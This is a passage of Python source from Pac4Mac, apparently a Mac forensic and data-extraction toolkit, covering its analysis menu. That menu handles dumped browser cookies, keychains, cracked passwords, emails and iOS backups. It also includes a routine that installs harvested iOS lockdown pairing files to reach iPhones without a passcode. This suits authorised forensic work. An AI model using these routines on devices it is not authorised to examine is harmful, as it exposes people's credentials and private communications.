					if "Device Name" in lines_plist[index_plist] or "Product Type" in lines_plist[index_plist] or "Phone Number" in lines_plist[index_plist]:
						print_next = 1
					elif "Product Version" in lines_plist[index_plist]:
						print_next = 1
						detect_version = 1
		
			ios_backup_to_analyse = raw_input("\nChoose a iOS backup to analyze (b to back) > ")
			if ios_backup_to_analyse != "b":
				try:
					intORnot=int(ios_backup_to_analyse)
					if int(ios_backup_to_analyse) < len(tab_results):
						base_db = tab_results[int(ios_backup_to_analyse)].replace("INFO_PLIST-","").replace("IOS_","")
						version_ios = tab_version[int(ios_backup_to_analyse)]
						fct_read_ios_sms(base_db,version_ios)
						fct_read_ios_call(base_db,version_ios)
						fct_read_ios_calendar(base_db,version_ios)
						fct_read_ios_contact(base_db,version_ios)
						ios_backup_to_analyse = "null"
					else : 
						print_red("\nPlease to choose a valid iOS backup\n")
						ios_backup_to_analyse = "null"
				except ValueError:
					print_red("\nPlease to choose a valid iOS backup\n")
					ios_backup_to_analyse = "null"

	else:
		print_log("No recording ...")



def fct_exploit_Lockdown() :

	print_log("\nFollowing iOs devices (UDID) are been connected to Mac  :")
	if os.path.isdir(dir_ios_devices):
		#destination into your system
		file=open(conf_client,'r')
		lines_conf_client=file.readlines()
		file.close()
		match_ios = "[IOS_DEVICES]"
		for i in range(len(lines_conf_client)):
			if match_ios in lines_conf_client[i]:
				filtre=re.compile('^\[IOS_DEVICES\](.+)',re.IGNORECASE)
				res=filtre.findall(lines_conf_client[i])
		
		tab_device = []
		for files in os.listdir(dir_ios_devices):
			if "SystemConfiguration" not in files:
				print_log(files.replace(".plist",""))
				tab_device.append(files.replace(".plist",""))

		display_inject_lockdown=raw_input("\nDo you want to copy iOS secrets key within your system ? y/[n] > ")
		
		if display_inject_lockdown == "y" :
			if var_uid == 0 :
				for dest_iPhone_Lockdown in res:
					if os.path.isdir(dest_iPhone_Lockdown):
						for files in os.listdir(dir_ios_devices):
							if files.endswith(".plist"):
								shutil.copy(dir_ios_devices + files,dest_iPhone_Lockdown)
						print_green("iPhone Lockdown files has been copied into your Lockdown directory with success")
						print_log("\nYou can access to following iOs devices without password :")
						for index_tab_device in range(len(tab_device)):
							print_green(tab_device[index_tab_device])
					else : print_red(dest_iPhone_Lockdown + " is not available\nPlease to check " + conf_client + " file")
			else:
				print_red("\nPlease to launch program with root privileges.")

	else : print_log(dir_ios_devices + " is not available")

	


####################################################################################################################################
											#[Exploit printed files]
####################################################################################################################################
def fct_exploit_printers():
	print_red("\n\n========================================================================")
	print_red("                   ==== Display printed files ====")
	print_red("========================================================================")

	if os.path.isdir(dir_dump_print_base):
		if os.listdir(dir_dump_print):
			print_log("\nOpening of Preview application to display printed files...")
			os.system("open -a preview " + dir_dump_print + "*")
			raw_input("\nPress to continue ...\n")
		else:
			print_log("No recording ... ")
	else:
		print_log("No recording ... ")

	print_red("\n========================================================================")
	print_red("                   ==== \\Display printed files ====")
	print_red("========================================================================")


####################################################################################################################################
											#[Display passwords]
####################################################################################################################################

def fct_display_pass():
	print_red("\n\n========================================================================")
	print_red("                   ==== Display prospective passwords ====")
	print_red("========================================================================")

	all_password_database = fct_generate_password(1)
	print_log("Prospective passwords :")
	for i in range(len(all_password_database)):
		print_green(all_password_database[i].strip("\n"))


	print_red("\n========================================================================")
	print_red("                   ==== \\Display prospective passwords ====")
	print_red("========================================================================")



####################################################################################################################################
											#[Exploit log files]
####################################################################################################################################
def fct_exploit_log():
	print_red("\n\n========================================================================")
	print_red("                        ==== Exploit log files ====")
	print_red("========================================================================")
	if os.path.exists(file_log_log):
		
		var_action = "null"
		while var_action == "null":
			print_green("\n1: Convert log files and log archives to unique text file (human readable)")
			print_green("2: Launch CheckOut4Mac from extracted log files")

			var_action=raw_input("\nYour choice (b to back) > ")

			if var_action == "1": 
				fct_convert_log()
				var_action = "null"
			elif var_action == "2":
				fct_checkout4Mac_Log()
			elif var_action == "b": 
				var_action = "no_null"
			else: 
				print_red("\nPlease to choose 1 or 2 ...\n")
				var_action = "null"

	else:
		print_log("\nNo recording, please to launch option 1 of Pac4Mac with root privileges ... \n")

	print_red("\n========================================================================")
	print_red("                   ==== \\Exploit log files ====")
	print_red("========================================================================")

####################################################################################################################################
											#[Convert log files/archives to human readable file]
####################################################################################################################################
def fct_convert_log():
	file=open(file_log_log,'r')
	lines_log_log = file.readlines()
	file.close()

	filtre = re.compile('^.+\ to\ (.+)\/(.+)$',re.IGNORECASE)
	#for VAR_LOG and VAR_AUDIT dir
	for i in range(len(lines_log_log)):
		res = filtre.findall(lines_log_log[i])
		for one_line in res:
			dir_path = one_line[0]
			dir_name = one_line[1]

			var_date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
			source_dir = dir_path + "/" + dir_name + "/"

			if "AUDIT" in dir_name:
				print_red("\n     ==== Conversion of Audit logs stored into: " + source_dir + "====\n")
				dest_file = name_dir_analysis + var_date_display + "_" + dir_name + ".txt"
				commands.getoutput("praudit –xn " + source_dir +  "* > " + dest_file)
				print_log("Results stored into " + dest_file + "\n")
			elif "LOG" in dir_name:
				#system.log
				print_red("\n     ==== Conversion of System logs stored into: " + source_dir + "====\n")
				dest_file = name_dir_analysis + var_date_display + "_" + dir_name + "_system.txt"
				commands.getoutput("cat " + source_dir + "system.log > " + dest_file)
				commands.getoutput("bzcat " + source_dir + "system.log* >> " + dest_file)
				print_log("Results stored into " + dest_file + "\n")

				#kernel.log
				print_red("\n     ==== Conversion of Kernel logs stored into: " + source_dir + "====\n")
				dest_file = name_dir_analysis + var_date_display + "_" + dir_name + "_kernel.txt"
				commands.getoutput("cat " + source_dir + "kernel.log > " + dest_file)
				commands.getoutput("bzcat " + source_dir + "kernel.log* >> " + dest_file)
				print_log("Results stored into " + dest_file + "\n")

				#syslog
				print_red("\n     ==== Conversion of Syslog (.asl) logs stored into: " + source_dir + "====\n")
				dest_file = name_dir_analysis + var_date_display + "_" + dir_name + "_ASL_syslog.txt"
				commands.getoutput("syslog  -T utc -F raw -d " + source_dir + "/asl/ > " + dest_file)
				print_log("Results stored into " + dest_file + "\n")

				#firewall log
				print_red("\n     ==== Conversion of Firewall logs stored into: " + source_dir + "====\n")
				dest_file = name_dir_analysis + var_date_display + "_" + dir_name + "_firewall.txt"
				commands.getoutput("cat " + source_dir + "appfirewall.log > " + dest_file)
				commands.getoutput("bzcat " + source_dir + "appfirewall.log* >> " + dest_file)
				print_log("Results stored into " + dest_file + "\n")

				#installation log
				print_red("\n     ==== Conversion of Installation logs stored into: " + source_dir + "====\n")
				dest_file = name_dir_analysis + var_date_display + "_" + dir_name + "_installation.txt"
				commands.getoutput("cat " + source_dir + "install.log > " + dest_file)
				commands.getoutput("bzcat " + source_dir + "install.log* >> " + dest_file)
				print_log("Results stored into " + dest_file + "\n")



####################################################################################################################################
											#[CheckOut4Mac on log files]
####################################################################################################################################
def fct_checkout4Mac_Log():

	file=open(file_log_log,'r')
	lines_log_log = file.readlines()
	file.close()

	filtre = re.compile('^.+\ to\ (.+)\/(.+)$',re.IGNORECASE)

	dir_audit = ""
	dir_syslog = ""
	dir_system = ""

	#for VAR_LOG and VAR_AUDIT dir
	for i in range(len(lines_log_log)):
		res = filtre.findall(lines_log_log[i])
		for one_line in res:
			dir_path = one_line[0]
			dir_name = one_line[1]

			source_dir = dir_path + "/" + dir_name + "/"

			if "VAR_AUDIT" in dir_name:
				dir_audit = source_dir
			elif "VAR_LOG" in dir_name:
				dir_system = source_dir

	os.system("python " + CheckOut4Mac_path + " -L -l " + dir_system + " -b " + dir_audit)




####################################################################################################################################
											#[Build mactime log files]
####################################################################################################################################
def fct_build_mactime():
	print_red("\n\n========================================================================")
	print_red("                        ==== Build MACTIME ====")
	print_red("========================================================================")

		
	var_action = "null"
	while var_action == "null":
		print_green("\n1: Build Mactime from FLS output")
		print_green("2: Build Mactime from $CatalogFile and Journal files")

		var_action=raw_input("\nYour choice (b to back) > ")

		if var_action == "1": 
			fct_mactime_fls()
			var_action = "null"
		elif var_action == "2":
			fct_mactime_catalogfile()
		elif var_action == "b": 
			var_action = "no_null"
		else: 
			print_red("\nPlease to choose 1 or 2 ...\n")
			var_action = "null"



	print_red("\n========================================================================")
	print_red("                   ==== \\Exploit log files ====")
	print_red("========================================================================")



####################################################################################################################################
											#[Timeline via FLS]
####################################################################################################################################
def fct_mactime_fls():
	print_red("\n\n========================================================================")
	print_red("                      ==== TimeLine from FLS ====")
	print_red("========================================================================")

	#list of results directory
	tab_ls_work = []
	for file in os.listdir(dir_work):
		if ".timeline.fls" in file and ".csv" not in file:
			tab_ls_work.append(file)
	if len(tab_ls_work) == 0:
		print_log("No recording into " + dir_work + ", please to launch option 6 of Pac4Mac\n")
	else:
		print_log("Available FLS files > ")

		for i in range(len(tab_ls_work)):
			print_green(str(i) + ". " + tab_ls_work[i])

		file_work = "null"

		while file_work == "null":
			file_work=raw_input("\nChoose a file (b to back) > ")
			if file_work != "b":
				try:
					if int(file_work) < len(tab_ls_work):
						file_work_name = dir_work + tab_ls_work[int(file_work)]
						print_log ("Selected file > " + file_work_name)
						
						#mactime from file_work
						var_date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
						dest_file = name_dir_analysis +  var_date_display + "_" + tab_ls_work[int(file_work)].replace(name_dir_analysis,"").replace("timeline.fls","mactime.csv")

						#extraction of timezone
						filtre = re.compile('.+\.(.+)\.mactime.csv',re.IGNORECASE)
						res = filtre.findall(dest_file)
						for j in res:
							var_timezone = j

							print_green("\nBuilting Mactime from [" + file_work + "], be patient \n...\n ")
							commands.getoutput(path_to_mactime + ' -b ' + file_work_name + ' -z "' + var_timezone + '" -d >' + dest_file)

						print_log("Results stored into " + dest_file + "\n")
					else:
						print_red("Please to choose a valid file !!\n")
						file_work = "null"

				except ValueError:
					print_red("Please to choose a valid file\n")
					file_work = "null"


	print_red("\n========================================================================")
	print_red("                      ==== \TimeLine from FLS ====")
	print_red("========================================================================")


####################################################################################################################################
											#[Timeline via Catalog File]
####################################################################################################################################
def fct_mactime_catalogfile():
	print_red("\n\n========================================================================")
	print_red("                      ==== TimeLine from Catalog File ====")
	print_red("========================================================================")
	
	var_date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
	dir_consolidation = "../analysis/" + var_date_display + "_ConsoCatalogFile/"
	dir_consolidation_b =  "analysis/" + var_date_display + "_ConsoCatalogFile/"

	
	ctg_file = ""
	jrn_file = ""
	vhf_file = ""

	print dir_results_catalogfile
	if os.path.exists(dir_results_catalogfile):
		for file in os.listdir(dir_results_catalogfile):
			if ".ctg" in file:
				ctg_file = file
				print_green("\nCatalog File is available : " + ctg_file)

			elif ".journal" in file:
				jrn_file = file
				print_green("Journal File is available : " + jrn_file)

			elif ".volheader" in file:
				vhf_file = file
				print_green("Volume Header File is available : " + vhf_file)
			
		
		if ctg_file == "" or jrn_file == "" or vhf_file == "":
			print_log("\nCatalog, Journal or Volume Header File is not available, please to launch option 6 of Pac4Mac ... \n")
			sys.exit()
		else:
			print_green("\nData consolidation of Journal, Catalog and Volume Header files, be patient \n...\n")
			if not os.path.isfile(dir_results_catalogfile + name_ahjp):
				shutil.copy(path_to_ahjp, dir_results_catalogfile)

			current_cwd = os.getcwd()
			os.chdir(dir_results_catalogfile)

			if not os.path.isdir(dir_consolidation):
				os.makedirs(dir_consolidation)

			os.system("./" + name_ahjp + " -c=" + ctg_file + " -j=" + jrn_file + " -v=" + vhf_file + " -o 0 -out=" + dir_consolidation)
			print_red("Results are stored into " + dir_work + dir_consolidation_b + "\n")
			os.chdir(current_cwd)
	
	else:
		print_log("\nNo recording, please to launch option 6 of Pac4Mac ... \n")

	print_red("\n\n========================================================================")
	print_red("                      ==== \TimeLine from Catalog File ====")
	print_red("========================================================================")


	################################################################################################################
##################################################################################################################################
											   #MAIN MENU
##################################################################################################################################
	################################################################################################################
def fct_menu_AN():
	
	if len(tab_ls_results) == 0:
		print_log("No recording into " + dir_results + ", please to extract data !\n")
		exit()
	
	check_conf_ini = raw_input("Please to check configuration of " + conf_client + " file (b to back, e to edit) > ")
	if check_conf_ini == "b": exit()
	elif check_conf_ini == "e": 
		os.system("open " + conf_client)
		raw_input("Press any key to continue")

	print_log("Available directories work > ")

	for i in range(len(tab_ls_results)):
		print_green(str(i) + ". " + tab_ls_results[i])

	dir_work=raw_input("\nChoose a directory (b to back) > ")
	if dir_work == "b":
		exit()
	try:
		intORnot=int(dir_work)
		if int(dir_work) < len(tab_ls_results):
			dir_work = dir_results + tab_ls_results[int(dir_work)] + "/"
			print_log ("\nDirectory Work > " + dir_work)
			return dir_work
		else:
			print_red("Please to choose a valid directory\n")
			return "null"

	except ValueError:
		print_red("Please to choose a valid directory\n")
		return "null"
	

def fct_menu_Exploit() :
	
	var_analysis = "null"

	while var_analysis == "null":

		print_red("\n[ ] LEAK INFORMATION")
		print_green("1:  Exploit Browser History")
		print_green("2:  Exploit Browser Cookies")
		print_green("3:  Display Browser Downloads")
		print_green("4:  Exploit Skype Messages")
		print_green("5:  Exploit Calendar Cache")
		print_green("6:  Exploit Email Messages")
		print_green("7:  Exploit RAM memory Dump")
		print_green("8:  Exploit Keychains")
		print_green("9:  Crack Hashes passwords")
		print_green("10: Exploit iOS files")
		print_green("11: Display Printed Documents")
		print_green("12: Display prospective passwords")
		print_red("\n[ ] SYSTEM INFORMATION")
		print_green("13: Exploit system logs")
		print_green("14: Build Mactime")
		print_green("\nb:  Back")
		var_analysis=raw_input("\nAnalysis to launch > ")
		
		if var_analysis == "1" : 
			list_browser=["FIREFOX","CHROME","SAFARI","OPERA"]

			print_red("\n\n========================================================================")
			print_red("                   ==== Exploit Browser History ====")
			print_red("========================================================================")
			if os.path.exists(dir_browser_dump):
				#to record
				date_display_history = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
				output_display_history = name_dir_analysis + date_display_history + "_BROWSER_HISTORY.txt"
				print_log("\nResults will be stored into " + output_display_history + "\n")
				raw_input("Press any key to continue...")

				for i in range(len(list_browser)):
					fct_read_history(list_browser[i],output_display_history)
			else:
				print_log("No recording ...")

			raw_input("\nDon't forget to display history QuarantineEvents into file " + dir_results + "history_net_sys_dump.txt\n")

			print_red("\n========================================================================")
			print_red("                   ==== \\Exploit Browser History ====")
			print_red("========================================================================")
		
		elif var_analysis == "2":
			list_browser=["FIREFOX","CHROME","SAFARI","OPERA"]

			print_red("\n\n========================================================================")
			print_red("                   ==== Exploit Browser Cookies ====")
			print_red("========================================================================")
			if os.path.exists(dir_browser_dump):
				#to record
				date_display_cookies = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
				output_display_cookies = name_dir_analysis + date_display_cookies + "_BROWSER_COOKIE.txt"
				print_log("\nResults will be stored into " + output_display_cookies + "\n")
				raw_input("Press any key to continue...")

				for i in range(len(list_browser)):
					fct_xploit_cookies(list_browser[i],output_display_cookies)
			else:
				print_log("No recording ...")
			print_red("\n========================================================================")
			print_red("                   ==== \\Exploit Browser Cookies ====")
			print_red("========================================================================")
		
		elif var_analysis == "3" :
			list_browser = ["FIREFOX","CHROME","SAFARI","OPERA"]

			print_red("\n\n========================================================================")
			print_red("                   ==== Exploit Browser Downloads ====")
			print_red("========================================================================")
			if os.path.exists(dir_browser_dump):
				#to record
				date_display_download = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
				output_display_download = name_dir_analysis + date_display_download + "_BROWSER_DOWNLOAD.txt"
				print_log("\nResults will be stored into " + output_display_download + "\n")
				raw_input("Press any key to continue...")

				for i in range(len(list_browser)):
					fct_read_down_history(list_browser[i],output_display_download)
			else:
				print_log("No recording ...")

			raw_input("\nDon't forget to display history QuarantineEvents into file " + dir_results + "history_net_sys_dump.txt\n")

			print_red("\n========================================================================")
			print_red("                   ==== \\Exploit Browser Downloads ====")
			print_red("========================================================================")
		
		elif var_analysis == "4": fct_exploit_skype()
		elif var_analysis == "5": fct_exploit_ical()
		elif var_analysis == "6": fct_exploit_emails()
		elif var_analysis == "7": fct_search_ram()
		elif var_analysis == "8": fct_exploit_keychain()
		elif var_analysis == "9": fct_exploit_password()
		elif var_analysis == "10": fct_exploit_iPhone()
		elif var_analysis == "11": fct_exploit_printers()
		elif var_analysis == "12": fct_display_pass()
		elif var_analysis == "13": fct_exploit_log()
		elif var_analysis == "14": fct_build_mactime()
		elif var_analysis == "b": exit()
		else: 
			print_red("\nPlease to choose a valid option\n")

		var_analysis = "null"

		if os.listdir(name_dir_analysis):
			os.system("chmod -Rf 777 " + name_dir_analysis )





	################################################################################################################
##################################################################################################################################
										   #MAIN PROGRAM
##################################################################################################################################
	################################################################################################################




print_red("\n                        ====Analysis Mode====")
print_green("========================================================================\n")

#current user
var_uid = os.geteuid()

#display menu to choose dir_work
dir_work = "null"
while dir_work == "null":
	dir_work = fct_menu_AN()

#directory for res analysis
name_dir_analysis = dir_work + 'analysis/'
if not os.path.isdir(name_dir_analysis): 
	os.makedirs(name_dir_analysis)

#file version osx
file_version_dest = dir_work + '#macosx_version.txt'
if os.path.exists(file_version_dest) :
	file = open(file_version_dest,'r')
	lines_version = file.readlines()
	file.close()
	target_version = lines_version[0]
	print_log ("  System > " + target_version.strip())

#file log pac4mac 
file_history_dest = dir_work + '#log_pac4mac.txt'

if os.path.exists(file_history_dest) :
	file = open(file_history_dest,'r')
	lines_version = file.readlines()
	file.close()

	print_log("  History > ")	
	for i in range(len(lines_version)):
		print_log("\t" + lines_version[i].strip("\n"))
	print_green("========================================================================")


var_log=str(datetime.datetime.now()) + ": " + "Analyzis " + "\n"
fct_writefile(var_log, file_history_dest)

#file store password found during dump and analysis
#files password
dir_passwords = dir_work + 'passwords_database/'
file_password_database = dir_passwords + 'ALL-passwords_1.txt'

file_password_database_analysis = dir_passwords + 'ALL-passwords_2.txt'
file_password_database = dir_passwords + 'ALL-passwords_1.txt'


#files system report
file_system_report = dir_work + 'sys_dump.txt'

# browser_dump files 
file_log_browser = dir_work + 'browser_dump.txt'
dir_browser_dump = dir_work + 'browser_dump/'


#dir history_net_sys dump
file_log_history_net_sys = dir_work + 'history_net_sys_dump.txt'
dir_dump_history_net_sys = dir_work + 'history_net_sys_dump/'



#dir skype dump
file_log_skype = dir_work + 'skype_dump.txt'
dir_dump_skype = dir_work + 'skype_dump/'

#print files
file_log_print = dir_work + 'print_dump.txt'
dir_dump_print_base = dir_work + 'print_dump/'
dir_dump_print = dir_dump_print_base + 'printed_documents/'

#spotlight files
file_log_spotlight = dir_work + 'spotlight_dump.txt'
dir_dump_spotlight = dir_work + 'spotlight_dump/'

#calendar output
file_log_calendar = dir_work + 'calendar_dump.txt'
dir_dump_calendar = dir_work + 'calendar_dump/'

# Email files
file_log_email = dir_work + 'email_dump.txt'
dir_dump_email = dir_work + 'email_dump/'
file_log_email_spot = dir_work + 'email_dump_spot.txt'
dir_dump_email_spot = dir_work + 'email_dump_spot/'

# ios files
file_log_ios = dir_work + 'iOS_dump.txt'
dir_dump_ios = dir_work + 'iOS_dump/'
dir_ios_devices = dir_dump_ios + 'ios_devices/'


#log files
file_log_log = dir_work + 'log_dump.txt'
dir_dump_log = dir_work + 'log_dump/'

#dir keychain dump
file_log_keychain = dir_work + 'keychain_dump.txt'
dir_dump_keychain = dir_work + 'keychain_dump/'
file_copy_keychain = dir_dump_keychain + 'downladed_keychain.txt'

file_keychain_current = dir_dump_keychain +' /keychain_current.keychain'
file_current_keychain_decrypted = dir_dump_keychain + '/keychain_current_decrypted.txt'
file_current_keychain_pass = dir_dump_keychain + '/passwords_current_keychain.txt'

size_pass_keychain = 25

#userfile files
dir_users_info = dir_work + '#users_info/'
file_usersadmin = dir_users_info + 'users_admin.txt'
file_allusershashes = dir_users_info + 'users_hashes.txt'
file_userslist = dir_users_info + 'users_list.txt'

#Mac Memory Reader
dir_path_RAM = dir_work + 'ram_dump/'
file_dump_RAM = dir_path_RAM + 'RAM_memory.dmp'
file_str_RAM = name_dir_analysis + 'RAM_memory.str'

#file system files
dir_results_catalogfile = dir_work + 'catalogFiles/'
#new_path_to_ahjp = dir_results_catalogfile




#display exploit menu
fct_menu_Exploit()



